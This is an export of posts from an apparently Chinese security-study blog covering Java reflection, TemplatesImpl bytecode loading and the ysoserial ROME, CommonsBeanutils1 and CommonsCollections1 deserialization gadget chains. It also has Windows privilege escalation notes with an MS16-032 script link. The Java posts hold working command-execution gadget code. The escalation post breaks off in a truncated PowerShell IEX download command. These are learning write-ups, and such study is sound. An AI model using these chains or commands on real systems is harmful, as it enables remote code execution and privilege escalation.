[{"title":"Hack The BOX记录","url":"/posts/b0a65e80.html","content":"\n\n\n## Meow\n\n### Task1:What does the acronym VM stand for?（首字母缩略词VM代表什么）\n\nvirtual machine\n\n"},{"title":"有关Java的小点","url":"/posts/b36bc80c.html","content":"\n碎碎念：学Java真的好折磨人呜呜呜呜，好多好多好多包，名字也不认识，方法也不会用，只能慢慢一步步往前走，哭哭😭，这篇文章主要是总结一些关于Java的有趣小点，看个乐呵涨点冷知识就好\n\n<!--more -->\n\n## 关于数字的类型转换\n\n看到这个是因为2022中科大的CTF有一道猜数字的题目，关键代码如下\n\n```java\npublic class test {\n    public static void main(String[] args) throws XMLStreamException {\n        double rand = 随机数一个;\n        var guess=Double.parseDouble(\"用户输入的数据\");\n        var isLess = rand < guess - 1e-6 / 2;\n        var isMore = rand > guess + 1e-6 / 2;\n\t\t\t\tif(!isLess&&!isMore&&一次猜对){\n          giveFlag();\n        }\n    }\n}\n```\n\n这里会随机生成一个0-1之间的double类型的随机数，用户需要猜其中的随机数是什么，并且只要一次猜对就会给flag，当然除非你运气已经好到一定地步了不然绝对不可能猜出来的，所以我们需要另辟蹊径了\n\n可以看到用户输入的数据类型是以字符串输入然后交给`parseDouble`函数转换成小数再进行判断的，那我们跟入`parseDouble`中看一下解析流程，逐层调用到`FloatingDecimal.readJavaFormatString`函数中，看到对特殊内容的解析部分\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210241949464.png)\n\n可以看到有三种特殊的解析类型，分别是NaN，Infinity和16进制，那我们分别用这几种试试看看最终效果\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210242001054.png)\n\n可以看到输入是NaN就能拿到flag，是因为NaN就像一个黑洞，任何数字和他进行运算结果都是NaN，Infinity也类似，不过在*0的时候会变成NaN，判断中Infinity大于任何数，而NaN表示非数值，所以不管进行什么运算结果都为NaN，布尔值为False\n\n## 关于Java代码调用的问题\n\nJava这个烂玩意让人困惑不是一天两天了，今天索性把Java中的代码调用问题一次性看完（调试完）\n\n首先是static关键字定义的类，我们在使用的时候需要直接定义，如下：\n\n```Java\nclassName.staticInnerClass xxx=new className.staticInnerClass()//静态内部类只能访问外部静态属性或方法\n```\n\n如果是一个非静态子类，就需要先实例化一个父类，再实例化子类\n\n```Java\nclassName xxx = new className();\nclassName.InnerClass inner  = xxx.new InnerClass();\n//或者一步到位\nclassName.InnerClass innerObject = new className().new InnerClass();\n```\n\n`synchronized`\n\n## 关于反射\n\n正常情况下，如果我们要调用一个对象的方法，或者访问一个对象的字段，通常会传入对象实例：\n\n```java\n// Main.java\nimport com.itranswarp.learnjava.Person;\n\npublic class Main {\n    String getFullName(Person p) {\n        return p.getFirstName() + \" \" + p.getLastName();\n    }\n}\n```\n\n但是，如果不能获得`Person`类，只有一个`Object`实例，比如这样：\n\n```java\nString getFullName(Object obj) {\n    return ???\n}\n```\n\n但是如果我们尝试强制转型，将其转换为Person对象，我们就发现这时还是需要引入原始的类定义才能转换，而反射就是为了避免这种情况的出现\n\n### 关于Java类型\n\n> 对于Java来说除了int之类的基本类型之外，Java的其他类型全都是`class`类型\n>\n> 那对于不同的数据类型之间，由于中间没有继承关系，所以互相无法进行赋值\n>\n> 而`class`是由JVM在执行过程中动态加载的。JVM在第一次读取到一种`class`类型时，将其加载进内存。\n>\n> 每加载一种`class`，JVM就为其创建一个`Class`类型的实例，并关联起来。注意：这里的`Class`类型是一个名叫`Class`的`class`。它长这样：\n>\n> ```\n> public final class Class {\n>     private Class() {}\n> }\n> ```\n>\n> \n>\n> 以`String`类为例，当JVM加载`String`类时，它首先读取`String.class`文件到内存，然后，为`String`类创建一个`Class`实例并关联起来：\n>\n> ```\n> Class cls = new Class(String);\n> ```\n>\n> 这个`Class`实例是JVM内部创建的，如果我们查看JDK源码，可以发现`Class`类的构造方法是`private`，只有JVM能创建`Class`实例，我们自己的Java程序是无法创建`Class`实例的。\n>\n> 所以，JVM持有的每个`Class`实例都指向一个数据类型（`class`或`interface`）：\n>\n> ```ascii\n> ┌───────────────────────────┐\n> │      Class Instance       │──────> String\n> ├───────────────────────────┤\n> │name = \"java.lang.String\"  │\n> └───────────────────────────┘\n> ┌───────────────────────────┐\n> │      Class Instance       │──────> Random\n> ├───────────────────────────┤\n> │name = \"java.util.Random\"  │\n> └───────────────────────────┘\n> ┌───────────────────────────┐\n> │      Class Instance       │──────> Runnable\n> ├───────────────────────────┤\n> │name = \"java.lang.Runnable\"│\n> └───────────────────────────┘\n> ```\n>\n> 一个`Class`实例包含了该`class`的所有完整信息：\n>\n> ```\n> ┌───────────────────────────┐\n> │      Class Instance       │──────> String\n> ├───────────────────────────┤\n> │name = \"java.lang.String\"  │\n> ├───────────────────────────┤\n> │package = \"java.lang\"      │\n> ├───────────────────────────┤\n> │super = \"java.lang.Object\" │\n> ├───────────────────────────┤\n> │interface = CharSequence...│\n> ├───────────────────────────┤\n> │field = value[],hash,...   │\n> ├───────────────────────────┤\n> │method = indexOf()...      │\n> └───────────────────────────┘\n> ```\n>\n> 由于JVM为每个加载的`class`创建了对应的`Class`实例，并在实例中保存了该`class`的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个`Class`实例，我们就可以通过这个`Class`实例获取到该实例对应的`class`的所有信息。\n>\n> 这种通过`Class`实例获取`class`信息的方法称为反射（Reflection）。\n\n以上内容来自廖雪峰老师的Java教程，写的真的很不错，下面来写一些帮助我自己理解的内容\n\n首先就是反射可以在java中执行的根本原因，就是Java会为在加载某个类的时候把类有关的信息存储起来，并且这部分就相当于是一个对象，我们可以通过反射访问到其中的内容，也就达成了获取其中的属性和方法的目的，又因为java数据都是通过字节码存储的，那么我们只需要按照字节码的生成规则对相应的位置的字节码进行修改就能达到修改内容的目的，并且还不会导致对应类的关联方法触发，这也是后面yso序列化链对反射大量使用的原因（防止链子生成的时候字节码就被执行）\n\n> 如何获取一个`class`的`Class`实例？有三个方法：\n>\n> 方法一：直接通过一个`class`的静态变量`class`获取：\n>\n> ```java\n> Class cls = String.class;\n> ```\n>\n> 方法二：如果我们有一个实例变量，可以通过该实例变量提供的`getClass()`方法获取：\n>\n> ```java\n> String s = \"Hello\";\n> Class cls = s.getClass();\n> ```\n>\n> 方法三：如果知道一个`class`的完整类名，可以通过静态方法`Class.forName()`获取：\n>\n> ```\n> Class cls = Class.forName(\"java.lang.String\");\n> ```\n>\n> 因为`Class`实例在JVM中是唯一的，所以，上述方法获取的`Class`实例是同一个实例。可以用`==`比较两个`Class`实例：\n>\n> ```\n> Class cls1 = String.class;\n> \n> String s = \"Hello\";\n> Class cls2 = s.getClass();\n> \n> boolean sameClass = cls1 == cls2; // true\n> ```\n>\n> 注意一下`Class`实例比较和`instanceof`的差别：\n>\n> ```\n> Integer n = new Integer(123);\n> \n> boolean b1 = n instanceof Integer; // true，因为n是Integer类型\n> boolean b2 = n instanceof Number; // true，因为n是Number类型的子类\n> \n> boolean b3 = n.getClass() == Integer.class; // true，因为n.getClass()返回Integer.class\n> boolean b4 = n.getClass() == Number.class; // false，因为Integer.class!=Number.class\n> ```\n>\n> 用`instanceof`不但匹配指定类型，还匹配指定类型的子类。而用`==`判断`class`实例可以精确地判断数据类型，但不能作子类型比较。\n>\n> 通常情况下，我们应该用`instanceof`判断数据类型，因为面向抽象编程的时候，我们不关心具体的子类型。只有在需要精确判断一个类型是不是某个`class`的时候，我们才使用`==`判断`class`实例。\n>\n> 因为反射的目的是为了获得某个实例的信息。因此，当我们拿到某个`Object`实例时，我们可以通过反射获取该`Object`的`class`信息：\n\n\n\n\n\n\n\n\n\n## 关于代理\n\n代理类是非常有意思的东西\n\n***动态代理***\n\n我们在正常使用接口的时候都是先编写一个对应的实现类，然后再编写对应的方法，但是通过代理，我们就可以在不实现接口的前提下生成一个对象，并为其添加对应的方法\n\n上面这个过程主要通过`handler`实现\n\n下面我们来看一下对于同样的功能我们传统的接口实现和使用代理有什么区别\n\n> 定义接口：\n>\n> ```\n> public interface Hello {\n>     void morning(String name);\n> }\n> ```\n>\n> 编写实现类：\n>\n> ```\n> public class HelloWorld implements Hello {\n>     public void morning(String name) {\n>         System.out.println(\"Good morning, \" + name);\n>     }\n> }\n> ```\n>\n> 创建实例，转型为接口并调用：\n>\n> ```\n> Hello hello = new HelloWorld();\n> hello.morning(\"Bob\");\n> ```\n>\n> 这种方式就是我们通常编写代码的方式。\n\n还有动态代理\n\n> 还有一种方式是动态代码，我们仍然先定义了接口`Hello`，但是我们并不去编写实现类，而是直接通过JDK提供的一个`Proxy.newProxyInstance()`创建了一个`Hello`接口对象。这种没有实现类但是在运行期动态创建了一个接口对象的方式，我们称为动态代码。JDK提供的动态创建接口对象的方式，就叫动态代理。\n>\n> 一个最简单的动态代理实现如下：\n>\n> ```java\n> import java.lang.reflect.InvocationHandler;\n> import java.lang.reflect.Method;\n> import java.lang.reflect.Proxy;\n> public class Main {\n>     public static void main(String[] args) {\n>         InvocationHandler handler = new InvocationHandler() {\n>             @Override\n>             public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n>                 System.out.println(method);\n>                 if (method.getName().equals(\"morning\")) {\n>                     System.out.println(\"Good morning, \" + args[0]);\n>                 }\n>                 return null;\n>             }\n>         };\n>         Hello hello = (Hello) Proxy.newProxyInstance(\n>             Hello.class.getClassLoader(), // 传入ClassLoader\n>             new Class[] { Hello.class }, // 传入要实现的接口\n>             handler); // 传入处理调用方法的InvocationHandler\n>         hello.morning(\"Bob\");\n>     }\n> }\n> \n> interface Hello {\n>     void morning(String name);\n> }\n> \n> ```\n>\n>  在运行期动态创建一个`interface`实例的方法如下：\n>\n> 1. 定义一个`InvocationHandler`实例，它负责实现接口的方法调用；\n>\n> 2. 通过\n>\n>    ```\n>    Proxy.newProxyInstance()\n>    ```\n>\n>    创建\n>\n>    ```\n>    interface\n>    ```\n>\n>    实例，它需要3个参数：\n>\n>    1. 使用的`ClassLoader`，通常就是接口类的`ClassLoader`；\n>    2. 需要实现的接口数组，至少需要传入一个接口进去；\n>    3. 用来处理接口方法调用的`InvocationHandler`实例。\n>\n> 3. 将返回的`Object`强制转型为接口。\n\n可以看到整个过程中我们根本没有对接口进行传统意义上的实现，\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## 关于TemplatesImpl利用链RCE的问题\n\n困惑很久了，主要是链子跟到最后一步不知道怎么最后RCE了\n\n要想知道这个类为什么可以触发RCE，首先我们要知道默认情况下Java执行系统命令需要使用的是什么，代码应当如下\n\n```Java\npublic class TouchFile{\n    public TouchFile() throws Exception {\n        Runtime.getRuntime().exec(\"calc\");\n    }   \n}\n```\n\n直接使用Runtime包中的函数执行即可，将这个类编译成字节码后再进行base64，然后交给defineClass来加载字节码，再执行其中\n\n```Java\nMethod defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class);\ndefineClass.setAccessible(true);\nbyte[] code =Base64.getDecoder().decode(\"yv66vgAAADQAHgoABgARCgASABMIABQKABIAFQcAFgcAFwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAYAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAApTb3VyY2VGaWxlAQAOVG91Y2hGaWxlLmphdmEMAAcACAcAGQwAGgAbAQAEY2FsYwwAHAAdAQAJVG91Y2hGaWxlAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAACAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAAEAAEABEADQASAAsAAAAEAAEADAAJAA0ADgACAAkAAAAmAAIAAQAAAAq4AAISA7YABFexAAAAAQAKAAAACgACAAAAFgAJABcACwAAAAQAAQAMAAEADwAAAAIAEA==\");\nClass yyds= (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), \"TouchFile\", code, 0, code.length);\nyyds.newInstance();\n```\n\n我们都知道 Java 的 ClassLoader 是用来加载字节码文件最基础的方法，ClassLoader 是什么呢？它就是一个“加载器”，告诉Java虚拟机如何加载这个类，用一句话概括它的作用就是将传入的字节码处理成真正的 Java 类然后返回。\n\n`ClassLoader` 处理字节码的流程为 `loadClass` -> `findClass` -> `defineClass`\n\n`loadClass`:：从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 `findClass` \n\n `findClass`： 根据基础URL指定的方式来加载类的字节码\n\n `defineClass`：处理前面传入的字节码，将其处理成真正的Java类\n\n所以将字节码转为 java 类的其实是 defineClass 方法，翻看源码 ClassLoader#defineClass 是一个protected属性，无法直接在外部访问，只能通过反射的形式来调用，所以在实际场景中很难利用到它。\n\n这也就是`TemplatesImpl`存在的意义，我们直接去看这个类的定义\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210232150702.png)\n\n可以看到TransletClassLoader定义了defineClass方法，对其进行调用\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210232300218.png)\n\n再向前查找发现defineTransletClasses中生成了TransletClassLoader并调用了其中的defineClass方法，不过到这一步依然是private子类无法被外界直接调用，所以我们继续向上\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210232305532.png)\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210232310998.png)\n\n最终找到newTransformer为public，可以直接被调用了，最终利用链如下\n\n```Java\nTemplatesImpl#newTransformer() ->\nTemplatesImpl#getTransletInstance() ->\nTemplatesImpl#defineTransletClasses() ->\nTransletClassLoader#defineClass()\n```\n\n```Java\n//未成功触发\nTemplatesImpl#getTransletIndex() -> \nTemplatesImpl#defineTransletClasses() ->\nTransletClassLoader#defineClass()\n```\n\n```Java\nTemplatesImpl#getOutputProperties() ->\nTemplatesImpl#newTransformer() -> \nTemplatesImpl#getTransletInstance() -> \nTemplatesImpl#defineTransletClasses() ->\nTransletClassLoader#defineClass() \n```\n\n看完这个我们可以看看ysoserial最后是怎么通过他构造出来一个可供命令执行的字节码的\n\n"},{"title":"ysoserial反序列化","url":"/posts/7ecbecc0.html","content":"\n## ROME\n\n```java\n链子\n/**\n *\n * TemplatesImpl.getOutputProperties()\n * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])\n * NativeMethodAccessorImpl.invoke(Object, Object[])\n * DelegatingMethodAccessorImpl.invoke(Object, Object[])\n * Method.invoke(Object, Object...)\n * ToStringBean.toString(String)\n * ToStringBean.toString()\n * ObjectBean.toString()\n * EqualsBean.beanHashCode()\n * ObjectBean.hashCode()\n * HashMap<K,V>.hash(Object)\n * HashMap<K,V>.readObject(ObjectInputStream)\n *\n * @author mbechler\n *\n */\n```\n\n我们先跟着反序列化的链子走一遍试试\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211652278.png)\n\n`HashMap<K,V>.readObject(ObjectInputStream)`这个是反序列化的入口，不过奇怪的是看到前面的内容好像没有什么大用，那就直接往下跟，走`hash`函数\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211655111.png)\n\n`HashMap<K,V>.hash(Object)`检查传入的key是否为空，如果为空就返回0，否则执行key的`hashCode`函数，此处key为`ObjectBean`类对象，继续走`hashCode`\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211657876.png)\n\n`ObjectBean.hashCode()`继续调用`EqualsBean`的`beanHashCode`\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211659382.png)\n\n`EqualsBean.beanHashCode()`继续调用`ObjectBean`的`toString`方法，hashCode会在漏洞触发后再被执行，所以此处不需要管\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211701563.png)\n\n`ObjectBean.toString()`继续调用`ToStringBean`的`toString`方法\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210211703142.png)\n\n`ToStringBean.toString()`看到最后prefix就相当于拿出来调用链开始的原对象的类名，传入同名函数中执行\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210222355753.png)\n\n这个方法会调用 `BeanIntrospector.getPropertyDescriptors()` 来获取 `_beanClass` 的全部 getter/setter 方法，然后判断参数长度为 0 的方法使用 `_obj` 实例进行反射调用，翻译成人话就是会调用所有 getter 方法拿到全部属性值，然后打印出来，显然getter都是无参方法，所以会导致所有getter方法都被调用了一遍\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210230019005.png)\n\n我们继续跟入`Method.invoke()`，到最后调用了`DelegatingMethodAccessorImpl.invoke(Object, Object[])`\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210230026318.png)\n\n跟入调用同类下的`invoke0`，最终触发`TemplatesImpl.getOutputProperties()`导致RCE\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210230029269.png)\n\n走完一遍链子大概知道整个反序列化是怎么触发的了，能挖出来的真的是神仙（\n\n## CommonsBeanutils1\n\n嗷呜，首先还是扔一个反序列化链子\n\n```\nPriorityQueue.readObject()\nPriorityQueue.heapify()\nPriorityQueue.siftDown()\nsiftDownUsingComparator()\nBeanComparator.compare()\nTemplatesImpl.getOutputProperties()\nTemplatesImpl.newTransformer()\nTemplatesImpl.getTransletInstance()\nTemplatesImpl.defineTransletClasses()\nTemplatesImpl.TransletClassLoader.defineClass()\n```\n\n这次我们可以看到在createObject的时候最终返回了一个`PriorityQueue`类对象，关于这个类\n\n> PriorityQueue是基于优先堆的一个无界队列，这个优先队列中的元素可以默认自然排序或者通过提供的[Comparator](http://www.journaldev.com/780/java-comparable-and-comparator-example-to-sort-objects)（比较器）在队列实例化的时排序。\n>\n> 简单来说就是 PriorityQueue 会对队列中的元素用比较器 Comparator 进行排序，而 CommonsBeanutils1 中使用的比较器为 BeanComparator。\n\n那这和我们的反序列化有什么关系呢，我们先对这个链子进行一次反序列化试试\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260154357.png)\n\n我们先直接来看这个类的`readObject`函数，看到最后调用了`heapify`***#堆化***函数，我们跟入一下\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260156906.png)\n\n可以看到其中调用了`siftDown`***#筛选***函数，我们继续跟入\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260159298.png)\n\n其中调用了`siftDownUsingComparator`***#用比较器筛选***函数，此处的比较器使用的是`BeanComparator`，继续跟入\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260201908.png)\n\n这里对之前队列中的内容调用了`compare`***#比较***函数，跟入\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260202428.png)\n\n看到其中的比较器函数具体代码，跟入`PropertyUtils.getProperty`***#属性工具类:获取属性***方法，这个方法具体是什么内容呢\n\n> 而 getProperty() 的定义如下：\n>\n> `PropertyUtils.getProperty(Object bean, String name)`\n> `bean` 是不为null的Java Bean实例\n> `name` 是Java Bean属性名称 (也就是方法中的getXxx(), setXxx(), 其中的xxx成为这个java bean的bean属性, java中的类成员变量称为字段, 并不是属性。\n> 这个方法是调用bean对象中的getname()方法\n\n就相当于直接调用了bean对象中的getxxx()方法，又因为反序列化我们对内容可控，我们就可以任意调用任意对象的任意get方法，在这里o1，o2就是我们反序列化生成的`PriorityQueue`中的元素，而`property`属性也可控，所以条件成立，可以任意调用get方法\n\n此处我们只需要找到一个危险的get方法就行了，还是使用`TemplatesImpl`类，关于这个类RCE可以去看另一个JAVA小点文章，在此不再赘述\n\n最后我们再回来看ysoserial中对这条链的利用代码\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260214643.png)\n\n豁然开朗喵喵\n\n## ComminsCollections1（CC1）\n\n先上链子\n\n```java\n/*\nGadget chain:\n    ObjectInputStream.readObject()\n        AnnotationInvocationHandler.readObject()\n            Map(Proxy).entrySet()\n                AnnotationInvocationHandler.invoke()\n                    LazyMap.get()\n                        ChainedTransformer.transform()\n                            ConstantTransformer.transform()\n                            InvokerTransformer.transform()\n                                Method.invoke()\n                                    Class.getMethod()\n                            InvokerTransformer.transform()\n                                Method.invoke()\n                                    Runtime.getRuntime()\n                            InvokerTransformer.transform()\n                                Method.invoke()\n                                    Runtime.exec()\n\nRequires:\n    commons-collections\n */\n```\n\n在来一句大佬的话\n\n> CC1 链的关键在三个实现了Transformer接⼝的类 ChainedTransformer ConstantTransformer InvokerTransformer，Transformer 顾名思义就是一个转换器用来处理传入的对象，然后将处理完的对象返回。\n\n```Java\n//Transformer接口\npackage org.apache.commons.collections;\n\npublic interface Transformer {\n    Object transform(Object var1);\n}\n```\n\n那我们就看看在commons.collection都有哪些类实现了这个接口\n\n1. ### InvokerTransformer（调用者转换器）\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211072202716.png)\n\n   可以看到通过获取`this.iMethodName, this.iParamTypes, this.iArgs`来反射调用传入类的方法，其中内容都可控，那我们是不是只要传入一个Runtime对象，调用其中的exec方法，就能任意命令执行了呢\n\n   直接调用可行性验证\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211072215402.png)\n\n   发现成功执行了，但是直接找到⼀个类，它在反序列化的 `readObject` 里直接或间接调用了 `InvokerTransformer` 的 `transform` 方法，并且参数可控，就能RCE，是这样吗？肯定不是，我们都知道待序列化的对象和所有它使⽤的内部属性对象，必须都实现了 `java.io.Serializable` 接⼝。我们需要传给 `transform` 方法的参数是 `Runtime` 对象，在序列化的时候肯定也属于内部属性对象，而它是没有实现 `java.io.Serializable` 接⼝的，所以即使找到了符合条件的类也没办法构造成序列化数据。\n\n2. ### ChainedTransformer（链条转换器）\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211081031321.png)\n\n   此类的transform通过按顺序调用 `Transformer` 数组 `this.iTransformers` 中所有 `Transformer` 对象的 `transform` 方法，并且每次调用的结果传递给下一个项目的transform进行调用，就像一个链条一样逐层传递执行，那么二者结合我们就可以利用`InvokerTransformer`通过反射来间接生成一个`Runtime`类，进而RCE\n\n   ```java\n   //反射获取Runtime类\n   Class clazz = Class.forName(\"java.lang.Runtime\");\n   Method getRuntimeMethod = clazz.getMethod(\"getRuntime\");\n   Runtime runtime = (Runtime) getRuntimeMethod.invoke(null);\n   runtime.exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\");\n   ```\n\n   ```java\n   //链式调用写法\n   Transformer[] transformers = new Transformer[]{\n           new InvokerTransformer(//生成Runtime类对象\n                   \"forName\",\n                   new Class[] {String.class},\n                   new Object[] {\"java.lang.Runtime\"}\n           ),\n           new InvokerTransformer(//获取getRuntime方法\n                   \"getMethod\",\n                   new Class[] {String.class,Class[].class},\n                   new Object[] {\"getRuntime\",new Class[0]}\n           ),\n           new InvokerTransformer(\"invoke\", new Class[] {//获取invoke方法执行\n                   Object.class, Object[].class }, new Object[] {\n                   null, new Object[0] }),\n           new InvokerTransformer(//RCE\n                   \"exec\",\n                   new Class[] {String.class},\n                   new String[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}\n           )\n   };\n   ```\n   \n   最后调用 `ChainedTransformer#transform()` 即可,参数为 `class`对象`Class.class`\n   \n   最后就是我们怎么获取到一个class对象作为我们链式调用的起点，我们继续往下走\n   \n3. ### ConstantTransformer（常量转换器）\n\n   最后我们再来看`ConstantTransformer`，这个类实现了序列化接口所以也可以进行反序列化\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211100043086.png)\n\n   可以看到`transform`函数就直接返回了`this.iConstant`，这里的`iConstant`我们直接传入即可，说白了就是拿一个对象包裹一个对象（听起来多少有点没用），不过，由于其`transform`方法会将其中的`iConstant`直接返回，我们就可以在其中包裹一个class类对象来作为上面的链式调用的起点，最终构造的链子如下\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211100110622.png)\n\n   最终只要调用transform随便扔点啥进去都能调用成功\n\n**LazyMap**\n\n下面我们就要进行完整的调用链构造了，RCE的部分我们已经完成了，下一步就是找在`readObject`方法中调用了可控参数的`transform`方法的类了，这里ysoserial链子使用的是`AnnotationInvocationHandler`-->`LazyMap#get()`\n\n先来看看`AnnotationInvocationHandler`***#注释信息处理***，其中的`readObject`方法中并没有直接调用到`Map` 的`get`方法，但是在 `AnnotationInvocationHandler#invoke()` 方法调用了 `get` 方法，`this.memberValues`可控并且为`Map`类，那么我们找个实现了Map接口的类即可，此处利用的是`LazyMap`\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211110059774.png)\n\n我们继续跟入，发现`LazyMap`重写了`get`方法如下，对`factory`属性的`transform`方法进行了调用，此处的factory为Transformer类，使用其的实现类即可（也就是我们用来RCE的ChainedTransformer）\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211110105849.png)\n\n现在的问题就是我们如何调用`AnnotationInvocationHandler#invoke()`方法了，这里涉及到的知识就是Java的动态代理，我们可以创建一个`AnnotationInvocationHandler`代理类，然后在调用`AnnotationInvocationHandler`代理类中的任意方法都会先调用`AnnotationInvocationHandler#invoke()`方法，是因为我们在调用类内非晶态\n\n总结一下现有的链子，我们先创建一个`LazyMap`对象，将其中的`factory`设置为构造好的`ChainedTransformer`，这样在调用`LazyMap`的`get`方法时就能链式调用导致RCE了，那我们现在再分析一下Poc\n\n```Java\npublic class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {\n\n\tpublic InvocationHandler getObject(final String command) throws Exception {\n\t\tfinal String[] execArgs = new String[] { command };\n\t\t//开一个chainedTransformer\n\t\tfinal Transformer transformerChain = new ChainedTransformer(\n\t\t\tnew Transformer[]{ new ConstantTransformer(1) });\n\t\t//真正的链子\n\t\tfinal Transformer[] transformers = new Transformer[] {\n\t\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\t\tnew InvokerTransformer(\"getMethod\", new Class[] {\n\t\t\t\t\tString.class, Class[].class }, new Object[] {\n\t\t\t\t\t\"getRuntime\", new Class[0] }),\n\t\t\t\tnew InvokerTransformer(\"invoke\", new Class[] {\n\t\t\t\t\tObject.class, Object[].class }, new Object[] {\n\t\t\t\t\tnull, new Object[0] }),\n\t\t\t\tnew InvokerTransformer(\"exec\",\n\t\t\t\t\tnew Class[] { String.class }, execArgs),\n\t\t\t\tnew ConstantTransformer(1) };\n\n\t\tfinal Map innerMap = new HashMap();\n\n\t\tfinal Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n\n\t\tfinal Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);\n\n\t\tfinal InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);\n\n\t\tReflections.setFieldValue(transformerChain, \"iTransformers\", transformers); // arm with actual transformer chain\n\n\t\treturn handler;\n\t}\n```\n\n## ComminsCollections3（CC3）\n\n```\n/*\n * Variation on CommonsCollections1 that uses InstantiateTransformer instead of\n * InvokerTransformer.\n */\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n文章引用：\n\nhttps://blog.csdn.net/solitudi/article/details/119082164\n\nhttps://www.anquanke.com/post/id/247434\n\nhttps://blog.weik1.top/\n"},{"title":"Windows内网域渗透 提权","url":"/posts/e80ed6fe.html","content":"\n# 低权限寻找提权手段\n\n常见的提权手段：\n\n1、本地溢出漏洞\n\n2、数据库提权\n\n3、第三方软件提权\n\n想要提权我们就需要先了解这台电脑上面究竟有什么漏洞可供我们利用，所以第一件事还是通过信息收集来找到我们可以利用的漏洞，这里有一些可以帮助我们的脚本\n\n## 寻找提权漏洞\n\n### Windows Exploit Suggester - Next Generation (WES-NG)\n\n[脚本链接](https://github.com/bitsadmin/wesng)\n\n这个脚本可以通过计算机的系统信息来看到电脑的补丁信息，进而推断出当前机器可被利用的漏洞\n\n获取信息的方式有三种\n\n> There are two options to check for missing patches: a. Launch `missingkbs.vbs` on the host to have Windows determine which patches are missing b. Use Windows' built-in `systeminfo.exe` tool to obtain the system information of the local system, or from a remote system using `systeminfo /S MyRemoteHost`, and redirect this to a file: `systeminfo > systeminfo.txt`\n>\n> 有两个选项可以检查缺失的补丁：在主机上启动`missingkbs.vbs`，让 Windows 确定缺少哪些补丁 b.使用Windows内置的`systeminfo.exe`工具获取本地系统的系统信息，或者使用`systeminfo /S MyRemoteHost`从远程系统获取系统信息，并将其重定向到一个文件：`systeminfo > systeminfo.txt`\n\n获取到的信息放到文件中传入脚本执行即可看到结果\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210202009074.png)\n\n## 提权脚本大全\n\n\n\n\n\n\n\n\n\n\n\n### 溢出漏洞提权\n\n#### MS16-032提权\n\n通过这个漏洞我们可以以一个普通用户身份，来添加一个administrator管理员组的用户，还能以SYSTEM权限来运行程序\n\n漏洞前提：目标系统需要有2个以上的CPU核心，并且PowerShell是2.0以上的版本\n\n此漏洞影响Windows Vista到Windows10之间的所有未修复设备\n\n首先找到对应的[提权脚本](https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1)，按教程来说直接运行就好，但是我本机环境尝试了好多遍都没有反应，打开报错后发现是因为原始状态下限制了powershell执行脚本，在我想如何不使用管理员权限修改powershell控制时，发现了另一种执行脚本的方法\n\n```cmd\npowershell -nop -exec bypass -c \"IEX (New-Object 